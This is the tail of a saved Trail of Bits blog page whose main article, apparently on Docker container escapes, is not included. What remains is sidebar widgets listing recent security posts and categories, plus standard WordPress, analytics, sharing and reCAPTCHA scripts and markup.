		</aside><aside id="rss_links-4" class="widget widget_rss_links"><h1 class="widget-title">Subscribe via RSS</h1><p class="size-small"><a class="feed-image-link" href="https://blog.trailofbits.com/feed/" title="Subscribe to Posts"><img src="CB19_files/red-small.png" alt="RSS Feed"></a>&nbsp;<a href="https://blog.trailofbits.com/feed/" title="Subscribe to Posts">RSS - Posts</a></p>
</aside>		<aside id="recent-posts-5" class="widget widget_recent_entries">		<h1 class="widget-title">Recent Posts</h1>		<ul>
											<li>
					<a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">Understanding Docker container&nbsp;escapes</a>
									</li>
											<li>
					<a href="https://blog.trailofbits.com/2019/07/16/trail-of-bits-named-in-forrester-wave-as-a-leader-in-midsize-cybersecurity-consulting-services/">Trail of Bits Named in Forrester Wave as a Leader in Midsize Cybersecurity Consulting&nbsp;Services</a>
									</li>
											<li>
					<a href="https://blog.trailofbits.com/2019/07/12/librabft/">On LibraBFT’s use of&nbsp;broadcasts</a>
									</li>
											<li>
					<a href="https://blog.trailofbits.com/2019/07/08/fuck-rsa/">Seriously, stop using&nbsp;RSA</a>
									</li>
											<li>
					<a href="https://blog.trailofbits.com/2019/07/03/avoiding-smart-contract-gridlock-with-slither/">Avoiding Smart Contract “Gridlock” with&nbsp;Slither</a>
									</li>
											<li>
					<a href="https://blog.trailofbits.com/2019/07/02/state/">State of the Art Proof-of-Work:&nbsp;RandomX</a>
									</li>
											<li>
					<a href="https://blog.trailofbits.com/2019/07/01/siderophile-expose-your-crates-unsafety/">Siderophile: Expose your Crate’s&nbsp;Unsafety</a>
									</li>
											<li>
					<a href="https://blog.trailofbits.com/2019/06/27/use-constexpr-for-faster-smaller-and-safer-code/">Use constexpr for faster, smaller, and safer&nbsp;code</a>
									</li>
											<li>
					<a href="https://blog.trailofbits.com/2019/06/26/panicking-the-right-way-in-go/">Panicking the right way in&nbsp;Go</a>
									</li>
											<li>
					<a href="https://blog.trailofbits.com/2019/06/25/creating-an-llvm-sanitizer-from-hopes-and-dreams/">Creating an LLVM Sanitizer from Hopes and&nbsp;Dreams</a>
									</li>
											<li>
					<a href="https://blog.trailofbits.com/2019/06/20/getting-2fa-right-in-2019/">Getting 2FA Right in&nbsp;2019</a>
									</li>
											<li>
					<a href="https://blog.trailofbits.com/2019/06/19/trail-of-bits-icse-2019-recap/">Trail of Bits @ ICSE 2019 –&nbsp;Recap</a>
									</li>
											<li>
					<a href="https://blog.trailofbits.com/2019/06/18/why-you-should-go-to-querycon-this-week/">Why you should go to QueryCon this&nbsp;week</a>
									</li>
											<li>
					<a href="https://blog.trailofbits.com/2019/06/17/leaves-of-hash/">Leaves of Hash</a>
									</li>
											<li>
					<a href="https://blog.trailofbits.com/2019/06/07/announcing-manticore-0-3-0/">Announcing Manticore 0.3.0</a>
									</li>
					</ul>
		</aside><aside id="text-112416546" class="widget widget_text"><h1 class="widget-title">Yearly Archive</h1>			<div class="textwidget"><ul>
<li><a href="https://blog.trailofbits.com/2018">2018</a></li>
<li><a href="https://blog.trailofbits.com/2017">2017</a></li>
<li><a href="https://blog.trailofbits.com/2016">2016</a></li>
<li><a href="https://blog.trailofbits.com/2015">2015</a></li>
<li><a href="https://blog.trailofbits.com/2014">2014</a></li>
<li><a href="https://blog.trailofbits.com/2013">2013</a></li>
<li><a href="https://blog.trailofbits.com/2012">2012</a></li>
</ul></div>
		</aside><aside id="categories-4" class="widget widget_categories"><h1 class="widget-title">Categories</h1>		<ul>
				<li class="cat-item cat-item-291"><a href="https://blog.trailofbits.com/category/apple/">Apple</a> (9)
</li>
	<li class="cat-item cat-item-141319"><a href="https://blog.trailofbits.com/category/attacks/">Attacks</a> (7)
</li>
	<li class="cat-item cat-item-44620"><a href="https://blog.trailofbits.com/category/authentication/">Authentication</a> (5)
</li>
	<li class="cat-item cat-item-502354744"><a href="https://blog.trailofbits.com/category/binary-ninja/">Binary Ninja</a> (9)
</li>
	<li class="cat-item cat-item-64575263"><a href="https://blog.trailofbits.com/category/blockchain/">Blockchain</a> (24)
</li>
	<li class="cat-item cat-item-1364812"><a href="https://blog.trailofbits.com/category/capture-the-flag/">Capture the Flag</a> (10)
</li>
	<li class="cat-item cat-item-100030"><a href="https://blog.trailofbits.com/category/compilers/">Compilers</a> (18)
</li>
	<li class="cat-item cat-item-9204"><a href="https://blog.trailofbits.com/category/conferences/">Conferences</a> (21)
</li>
	<li class="cat-item cat-item-182564"><a href="https://blog.trailofbits.com/category/containers/">Containers</a> (1)
</li>
	<li class="cat-item cat-item-25818"><a href="https://blog.trailofbits.com/category/cryptography/">Cryptography</a> (17)
</li>
	<li class="cat-item cat-item-199448218"><a href="https://blog.trailofbits.com/category/cyber-grand-challenge/">Cyber Grand Challenge</a> (7)
</li>
	<li class="cat-item cat-item-55871"><a href="https://blog.trailofbits.com/category/darpa/">DARPA</a> (16)
</li>
	<li class="cat-item cat-item-4181544"><a href="https://blog.trailofbits.com/category/dynamic-analysis/">Dynamic Analysis</a> (9)
</li>
	<li class="cat-item cat-item-1342"><a href="https://blog.trailofbits.com/category/education/">Education</a> (11)
</li>
	<li class="cat-item cat-item-551269408"><a href="https://blog.trailofbits.com/category/empire-hacking/">Empire Hacking</a> (6)
</li>
	<li class="cat-item cat-item-1360277"><a href="https://blog.trailofbits.com/category/engineering-practice/">Engineering Practice</a> (6)
</li>
	<li class="cat-item cat-item-924"><a href="https://blog.trailofbits.com/category/events/">Events</a> (5)
</li>
	<li class="cat-item cat-item-14563"><a href="https://blog.trailofbits.com/category/exploits/">Exploits</a> (17)
</li>
	<li class="cat-item cat-item-1643774"><a href="https://blog.trailofbits.com/category/fuzzing/">Fuzzing</a> (17)
</li>
	<li class="cat-item cat-item-2812"><a href="https://blog.trailofbits.com/category/go/">Go</a> (1)
</li>
	<li class="cat-item cat-item-320"><a href="https://blog.trailofbits.com/category/guides/">Guides</a> (7)
</li>
	<li class="cat-item cat-item-25357667"><a href="https://blog.trailofbits.com/category/internship-projects/">Internship Projects</a> (7)
</li>
	<li class="cat-item cat-item-96379492"><a href="https://blog.trailofbits.com/category/iverify/">iVerify</a> (2)
</li>
	<li class="cat-item cat-item-46713213"><a href="https://blog.trailofbits.com/category/kubernetes/">Kubernetes</a> (1)
</li>
	<li class="cat-item cat-item-15593"><a href="https://blog.trailofbits.com/category/malware/">Malware</a> (6)
</li>
	<li class="cat-item cat-item-1056516"><a href="https://blog.trailofbits.com/category/manticore/">Manticore</a> (10)
</li>
	<li class="cat-item cat-item-245013018"><a href="https://blog.trailofbits.com/category/mcsema/">McSema</a> (10)
</li>
	<li class="cat-item cat-item-171"><a href="https://blog.trailofbits.com/category/meta/">Meta</a> (9)
</li>
	<li class="cat-item cat-item-6701995"><a href="https://blog.trailofbits.com/category/mitigations/">Mitigations</a> (9)
</li>
	<li class="cat-item cat-item-293462444"><a href="https://blog.trailofbits.com/category/osquery/">osquery</a> (17)
</li>
	<li class="cat-item cat-item-208532"><a href="https://blog.trailofbits.com/category/paper-review/">Paper Review</a> (7)
</li>
	<li class="cat-item cat-item-6672"><a href="https://blog.trailofbits.com/category/press-release/">Press Release</a> (16)
</li>
	<li class="cat-item cat-item-3279"><a href="https://blog.trailofbits.com/category/privacy/">Privacy</a> (6)
</li>
	<li class="cat-item cat-item-1589"><a href="https://blog.trailofbits.com/category/products/">Products</a> (4)
</li>
	<li class="cat-item cat-item-5030448"><a href="https://blog.trailofbits.com/category/program-analysis/">Program Analysis</a> (13)
</li>
	<li class="cat-item cat-item-113884"><a href="https://blog.trailofbits.com/category/research-practice/">Research Practice</a> (3)
</li>
	<li class="cat-item cat-item-299073"><a href="https://blog.trailofbits.com/category/reversing/">Reversing</a> (9)
</li>
	<li class="cat-item cat-item-185574"><a href="https://blog.trailofbits.com/category/rust/">Rust</a> (3)
</li>
	<li class="cat-item cat-item-401665"><a href="https://blog.trailofbits.com/category/sponsorships/">Sponsorships</a> (12)
</li>
	<li class="cat-item cat-item-538062"><a href="https://blog.trailofbits.com/category/static-analysis/">Static Analysis</a> (17)
</li>
	<li class="cat-item cat-item-19674948"><a href="https://blog.trailofbits.com/category/symbolic-execution/">Symbolic Execution</a> (10)
</li>
	<li class="cat-item cat-item-943"><a href="https://blog.trailofbits.com/category/training/">Training</a> (1)
</li>
	<li class="cat-item cat-item-29911"><a href="https://blog.trailofbits.com/category/year-in-review/">Year in Review</a> (4)
</li>
		</ul>
			</aside><aside id="twitter_timeline-3" class="widget widget_twitter_timeline"><iframe id="twitter-widget-2" scrolling="no" allowtransparency="true" allowfullscreen="true" class="twitter-timeline twitter-timeline-rendered" style="position: static; visibility: visible; display: inline-block; width: 100%; height: 2638.78px; padding: 0px; border: medium none; max-width: 100%; min-width: 180px; margin-top: 0px; margin-bottom: 0px;" data-widget-id="profile:trailofbits" title="Twitter Timeline" frameborder="0"></iframe></aside>		</div><!-- #secondary .widget-area -->

	</div><!-- #main -->

	<footer id="colophon" class="site-footer" role="contentinfo">
		<div class="site-info">
						<a></a>
			
					</div><!-- .site-info -->
	</footer><!-- .site-footer .site-footer -->
</div><!-- #page .hfeed .site -->

<!--  -->
<script type="text/javascript" src="CB19_files/gprofiles.js"></script>
<script type="text/javascript">
/* <![CDATA[ */
var WPGroHo = {"my_hash":""};
/* ]]> */
</script>
<script type="text/javascript" src="CB19_files/wpgroho.js"></script>

	<script>
		//initialize and attach hovercards to all gravatars
		jQuery( document ).ready( function( $ ) {

			if (typeof Gravatar === "undefined"){
				return;
			}

			if ( typeof Gravatar.init !== "function" ) {
				return;
			}			

			Gravatar.profile_cb = function( hash, id ) {
				WPGroHo.syncProfileData( hash, id );
			};
			Gravatar.my_hash = WPGroHo.my_hash;
			Gravatar.init( 'body', '#wp-admin-bar-my-account' );
		});
	</script>

		<div style="display:none">
	<div class="grofile-hash-map-bbba4ee4c641e0a8cfe055a65bc338e3">
	</div>
	</div>
<script type="text/javascript">
/* <![CDATA[ */
var HighlanderComments = {"loggingInText":"Logging In\u2026","submittingText":"Posting Comment\u2026","postCommentText":"Post Comment","connectingToText":"Connecting to %s","commentingAsText":"%1$s: You are commenting using your %2$s account.","logoutText":"Log Out","loginText":"Log In","connectURL":"https:\/\/trailofbits.wordpress.com\/public.api\/connect\/?action=request&domain=blog.trailofbits.com","logoutURL":"https:\/\/trailofbits.wordpress.com\/wp-login.php?action=logout&_wpnonce=29e316ba98","homeURL":"https:\/\/blog.trailofbits.com\/","postID":"98969","gravDefault":"identicon","enterACommentError":"Please enter a comment","enterEmailError":"Please enter your email address here","invalidEmailError":"Invalid email address","enterAuthorError":"Please enter your name here","gravatarFromEmail":"This picture will show whenever you leave a comment. Click to customize it.","logInToExternalAccount":"Log in to use details from one of these accounts.","change":"Change","changeAccount":"Change Account","comment_registration":"","userIsLoggedIn":"","isJetpack":"","text_direction":"ltr"};
/* ]]> */
</script>
<script type="text/javascript" src="CB19_files/a_002.js"></script>

	<script type="text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/blog.trailofbits.com\/2019\/07\/19\/understanding-docker-container-escapes\/":98969};
	</script>
					
<script type="text/javascript" src="CB19_files/a_003.js"></script>
<script type="text/javascript">
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "https://s1.wp.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.head.appendChild( corecss );
		var themecssurl = "https://s2.wp.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeDefault.css?m=1363304414h&amp;ver=3.0.9b";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		document.head.appendChild( themecss );
	})();
	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
	SyntaxHighlighter.defaults['toolbar'] = false;
	SyntaxHighlighter.all();

	// Infinite scroll support
	if ( typeof( jQuery ) !== 'undefined' ) {
		jQuery( function( $ ) {
			$( document.body ).on( 'post-load', function() {
				SyntaxHighlighter.highlight();
			} );
		} );
	}
</script>
<script type="text/javascript">
/* <![CDATA[ */
var actionbardata = {"siteID":"3681601","siteName":"Trail of Bits Blog","siteURL":"https:\/\/blog.trailofbits.com","icon":"<img alt='' src='https:\/\/secure.gravatar.com\/blavatar\/366132244d069d5db95fc295d4d3de3e?s=50&d=https%3A%2F%2Fs2.wp.com%2Fi%2Flogo%2Fwpcom-gray-white.png' class='avatar avatar-50' height='50' width='50' \/>","canManageOptions":"","canCustomizeSite":"","isFollowing":"","themeSlug":"premium\/everyday","signupURL":"https:\/\/wordpress.com\/start\/","loginURL":"https:\/\/wordpress.com\/log-in?redirect_to=https%3A%2F%2Fblog.trailofbits.com%2F2019%2F07%2F19%2Funderstanding-docker-container-escapes%2F&signup_flow=account&domain=blog.trailofbits.com","themeURL":"","xhrURL":"https:\/\/blog.trailofbits.com\/wp-admin\/admin-ajax.php","nonce":"dc3dfaf706","isSingular":"1","isFolded":"","isLoggedIn":"","isMobile":"","subscribeNonce":"<input type=\"hidden\" id=\"_wpnonce\" name=\"_wpnonce\" value=\"5b09c131e0\" \/>","referer":"https:\/\/blog.trailofbits.com\/2019\/07\/19\/understanding-docker-container-escapes\/","canFollow":"1","feedID":"49633430","statusMessage":"","customizeLink":"https:\/\/trailofbits.wordpress.com\/wp-admin\/customize.php?url=https%3A%2F%2Ftrailofbits.wordpress.com%2F2019%2F07%2F19%2Funderstanding-docker-container-escapes%2F","postID":"98969","shortlink":"https:\/\/wp.me\/pfrKF-pKh","canEditPost":"","editLink":"https:\/\/wordpress.com\/post\/blog.trailofbits.com\/98969","statsLink":"https:\/\/wordpress.com\/stats\/post\/98969\/blog.trailofbits.com","i18n":{"view":"View site","follow":"Follow","following":"Following","edit":"Edit","login":"Log in","signup":"Sign up","customize":"Customize","report":"Report this content","themeInfo":"Get theme: Everyday","shortlink":"Copy shortlink","copied":"Copied","followedText":"New posts from this site will now appear in your <a href=\"https:\/\/wordpress.com\/\">Reader<\/a>","foldBar":"Collapse this bar","unfoldBar":"Expand this bar","editSubs":"Manage subscriptions","viewReader":"View site in Reader","viewReadPost":"View post in Reader","subscribe":"Sign me up","enterEmail":"Enter your email address","followers":"Join 12,938 other followers","alreadyUser":"Already have a WordPress.com account? <a href=\"https:\/\/wordpress.com\/log-in?redirect_to=https%3A%2F%2Fblog.trailofbits.com%2F2019%2F07%2F19%2Funderstanding-docker-container-escapes%2F&signup_flow=account&domain=blog.trailofbits.com\">Log in now.<\/a>","stats":"Stats"}};
/* ]]> */
</script>
<script type="text/javascript">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="text/javascript" src="CB19_files/a.js"></script><div id="actionbar" class="actnbr-premium-everyday actnbr-has-follow"><ul><li class="actnbr-btn actnbr-hidden"> 			    	<a class="actnbr-action actnbr-actn-follow" href=""><svg class="gridicon gridicon__follow" height="24px" width="24px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M23 16v2h-3v3h-2v-3h-3v-2h3v-3h2v3h3zM20 2v9h-4v3h-3v4H4c-1.1 0-2-.9-2-2V2h18zM8 13v-1H4v1h4zm3-3H4v1h7v-1zm0-2H4v1h7V8zm7-4H4v2h14V4z"></path></g></svg><span>Follow</span></a> 			    	<div class="actnbr-popover tip tip-top-left actnbr-notice"> 			    		<div class="tip-arrow"></div> 			    		<div class="tip-inner actnbr-follow-bubble"></div> 			    	</div> 			    </li><li class="actnbr-ellipsis actnbr-hidden"> 			  <svg class="gridicon gridicon__ellipsis" height="24" width="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><circle cx="5" cy="12" r="2"></circle><circle cx="19" cy="12" r="2"></circle><circle cx="12" cy="12" r="2"></circle></g></svg> 			  <div class="actnbr-popover tip tip-top-left actnbr-more"> 			  	<div class="tip-arrow"></div> 			  	<div class="tip-inner"> 				  <ul> 				    <li class="actnbr-sitename actnbr-hidden"><a href="https://blog.trailofbits.com/"><img alt="" src="CB19_files/366132244d069d5db95fc295d4d3de3e.jpg" class="avatar avatar-50" width="50" height="50"> Trail of Bits Blog</a></li> 				   	<li class="actnbr-folded-customize actnbr-hidden"><a href="https://trailofbits.wordpress.com/wp-admin/customize.php?url=https%3A%2F%2Ftrailofbits.wordpress.com%2F2019%2F07%2F19%2Funderstanding-docker-container-escapes%2F"><svg class="gridicon gridicon__customize" height="20px" width="20px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M2 6c0-1.505.78-3.08 2-4 0 .845.69 2 2 2 1.657 0 3 1.343 3 3 0 .386-.08.752-.212 1.09.74.594 1.476 1.19 2.19 1.81L8.9 11.98c-.62-.716-1.214-1.454-1.807-2.192C6.753 9.92 6.387 10 6 10c-2.21 0-4-1.79-4-4zm12.152 6.848l1.34-1.34c.607.304 1.283.492 2.008.492 2.485 0 4.5-2.015 4.5-4.5 0-.725-.188-1.4-.493-2.007L18 9l-2-2 3.507-3.507C18.9 3.188 18.225 3 17.5 3 15.015 3 13 5.015 13 7.5c0 .725.188 1.4.493 2.007L3 20l2 2 6.848-6.848c1.885 1.928 3.874 3.753 5.977 5.45l1.425 1.148 1.5-1.5-1.15-1.425c-1.695-2.103-3.52-4.092-5.448-5.977z" data-reactid=".2.1.1:0.1b.0"></path></g></svg><span>Customize<span></span></span></a></li> 				    <li class="actnbr-folded-follow actnbr-hidden"><a class="actnbr-action actnbr-actn-follow" href=""><svg class="gridicon gridicon__follow" height="24px" width="24px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M23 16v2h-3v3h-2v-3h-3v-2h3v-3h2v3h3zM20 2v9h-4v3h-3v4H4c-1.1 0-2-.9-2-2V2h18zM8 13v-1H4v1h4zm3-3H4v1h7v-1zm0-2H4v1h7V8zm7-4H4v2h14V4z"></path></g></svg><span>Follow</span></a></li> 					<li class="actnbr-signup actnbr-hidden"><a href="https://wordpress.com/start/">Sign up</a></li> 				    <li class="actnbr-login actnbr-hidden"><a href="https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fblog.trailofbits.com%2F2019%2F07%2F19%2Funderstanding-docker-container-escapes%2F&amp;signup_flow=account&amp;domain=blog.trailofbits.com">Log in</a></li> 				     				    <li class="actnbr-shortlink actnbr-hidden"><a href="https://wp.me/pfrKF-pKh">Copy shortlink</a></li> 				    <li class="flb-report actnbr-hidden"><a href="http://en.wordpress.com/abuse/">Report this content</a></li> 				     				     				    <li class="actnbr-subs actnbr-hidden"><a href="https://subscribe.wordpress.com/">Manage subscriptions</a></li> 				    <li class="actnbr-fold actnbr-hidden"><a href="">Collapse this bar</a></li> 			      </ul> 			    </div> 		      </div> 		    </li> 	      </ul></div>
<script type="text/javascript">
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-twitter', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
				return false;
			});
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-linkedin', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
				return false;
			});
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-telegram', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomtelegram', 'menubar=1,resizable=1,width=450,height=450' );
				return false;
			});
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-facebook', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
				return false;
			});
</script>
<script type="text/javascript">
// <![CDATA[
(function() {
try{
  if ( window.external &&'msIsSiteMode' in window.external) {
    if (window.external.msIsSiteMode()) {
      var jl = document.createElement('script');
      jl.type='text/javascript';
      jl.async=true;
      jl.src='/wp-content/plugins/ie-sitemode/custom-jumplist.php';
      var s = document.getElementsByTagName('script')[0];
      s.parentNode.insertBefore(jl, s);
    }
  }
}catch(e){}
})();
// ]]>
</script>		<iframe src="CB19_files/master.html" scrolling="no" id="likes-master" name="likes-master" style="display:none;"></iframe>
		<div id="likes-other-gravatars"><div class="likes-text"><span>%d</span> bloggers like this:</div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
<script src="CB19_files/w.js" type="text/javascript" async="" defer="defer"></script>
<script type="text/javascript">
_tkq = window._tkq || [];
_stq = window._stq || [];
_tkq.push(['storeContext', {'blog_id':'3681601','blog_tz':'-4','user_lang':'en','blog_lang':'en','user_id':'0'}]);
_stq.push(['view', {'blog':'3681601','v':'wpcom','tz':'-4','user_id':'0','post':'98969','subd':'trailofbits'}]);
_stq.push(['extra', {'crypt':'UE40eW5QN0p8M2Y/RE1TaVhzUzFMbjdWNHpwZGhTayxPSUFCMGNrd29+Smw0TDhnZmRTK0hlRi9QSGh6bi9GXVhBJWIlZlR5U1JMLU8/MkNtblkvY1dQTWUzck1ZTW9vJjI3eC9Wb1dZUUc5d2xKaFFQOXZOMD9jUWEtdkNob19HLlc2Yj9SMm4xckxzaz0/LzZsOFlZVGtFYlk5Q1UmfEx+K2RHSjlIVHRhZ358RFVJMG1SMEJxNnBUVEhpW19IRjk3N2VGYmRFRitnajl+QVRMPTdFOHBRZVFFTXZ3TnImLXpafFJ5bysya1NOelBaRF9vWnZyaF8lLzl5TTJ6RlFRJUVURmNoTGNKSHp1cFQlSisrWWxxL1loX3RGVWxhY09VL1BMeUt0JnB+RGRMRFZnN0QvbHR8cnZKOW5bU3J4fGIrSnpmWXZNanh1eUFqaw=='}]);
_stq.push([ 'clickTrackerInit', '3681601', '98969' ]);
	</script>
<noscript><img src="https://pixel.wp.com/b.gif?v=noscript" style="height:0px;width:0px;overflow:hidden" alt="" /></noscript>
<script>
if ( 'object' === typeof wpcom_mobile_user_agent_info ) {

	wpcom_mobile_user_agent_info.init();
	var mobileStatsQueryString = "";
	
	if( false !== wpcom_mobile_user_agent_info.matchedPlatformName )
		mobileStatsQueryString += "&x_" + 'mobile_platforms' + '=' + wpcom_mobile_user_agent_info.matchedPlatformName;
	
	if( false !== wpcom_mobile_user_agent_info.matchedUserAgentName )
		mobileStatsQueryString += "&x_" + 'mobile_devices' + '=' + wpcom_mobile_user_agent_info.matchedUserAgentName;
	
	if( wpcom_mobile_user_agent_info.isIPad() )
		mobileStatsQueryString += "&x_" + 'ipad_views' + '=' + 'views';

	if( "" != mobileStatsQueryString ) {
		new Image().src = document.location.protocol + '//pixel.wp.com/g.gif?v=wpcom-no-pv' + mobileStatsQueryString + '&baba=' + Math.random();
	}
	
}
</script>



<div id="sharing_email" style="display: none;">
		<form action="/2019/07/19/understanding-docker-container-escapes/" method="post">
			<label for="target_email">Send to Email Address</label>
			<input type="email" name="target_email" id="target_email">

			
				<label for="source_name">Your Name</label>
				<input type="text" name="source_name" id="source_name">

				<label for="source_email">Your Email Address</label>
				<input type="email" name="source_email" id="source_email">

						<input type="text" id="jetpack-source_f_name" name="source_f_name" class="input" size="25" autocomplete="off" title="This field is for validation and should not be changed">
			
			<div class="g-recaptcha" data-sitekey="6LcmyE0UAAAAALID28yVNg7pFCodGaArJzHitez_" data-theme="light" data-type="image" data-tabindex="0"><div style="width: 304px; height: 78px;"><div><iframe src="CB19_files/anchor.html" role="presentation" name="a-4inqi9a137f4" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" width="304" height="78" frameborder="0"></iframe></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div></div>
			<script type="text/javascript" src="CB19_files/api.js" async=""></script>
			
			<img style="float: right; display: none" class="loading" src="CB19_files/loading.gif" alt="loading" width="16" height="16">
			<input type="submit" value="Send Email" class="sharing_send">
			<a rel="nofollow" href="#cancel" class="sharing_cancel" role="button">Cancel</a>

			<div class="errors errors-1" style="display: none;">
				Post was not sent - check your email addresses!			</div>

			<div class="errors errors-2" style="display: none;">
				Email check failed, please try again			</div>

			<div class="errors errors-3" style="display: none;">
				Sorry, your blog cannot share posts by email.			</div>
		</form>
	</div><iframe scrolling="no" allowtransparency="true" src="CB19_files/widget_iframe.html" title="Twitter settings iframe" style="display: none;" frameborder="0"></iframe><div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;" class="g-recaptcha-bubble-arrow"></div><div style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;" class="g-recaptcha-bubble-arrow"></div><div style="z-index: 2000000000; position: relative;"><iframe title="recaptcha challenge" src="CB19_files/bframe.html" style="width: 100%; height: 100%;" name="c-4inqi9a137f4" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" frameborder="0"></iframe></div></div><iframe id="rufous-sandbox" scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe></body></html>
<!--
	generated in 0.128 seconds
	81073 bytes batcached for 300 seconds
-->